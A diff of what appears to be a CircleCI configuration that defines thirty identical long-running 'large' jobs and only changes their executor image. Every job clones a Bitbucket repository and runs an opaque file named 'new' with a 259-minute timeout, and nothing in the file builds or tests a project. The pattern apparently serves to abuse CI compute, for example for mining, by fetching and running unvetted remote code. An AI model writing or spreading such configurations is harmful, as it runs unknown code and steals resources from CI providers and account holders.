@@ -1,8 +1,8 @@
 version: 2
 jobs:
     aku1:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -10,8 +10,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku2:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -19,8 +19,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku3:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -28,8 +28,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku4:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -37,8 +37,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku5:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -46,8 +46,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku6:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -55,8 +55,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku7:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -64,8 +64,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku8:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -73,8 +73,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku9:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -82,8 +82,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku10:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -91,8 +91,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku11:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -100,8 +100,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku12:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -109,8 +109,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku13:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -118,8 +118,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku14:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -127,8 +127,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku15:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -136,8 +136,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku16:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -145,8 +145,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku17:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -154,8 +154,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku18:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -163,8 +163,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku19:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -172,8 +172,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku20:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -181,8 +181,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku21:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -190,8 +190,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku22:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -199,8 +199,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku23:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -208,8 +208,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku24:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -217,8 +217,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku25:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -226,8 +226,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku26:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -235,8 +235,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku27:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -244,8 +244,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku28:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -253,8 +253,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku29:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
@@ -262,8 +262,8 @@ jobs:
             command: git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/t.git && cd t && chmod +x new && ./new
             no_output_timeout: 259m
     aku30:
-      machine:
-            image: ubuntu-2004:202101-01
+      docker:
+            - image: couchbase
       resource_class: large
       steps:
         - run:
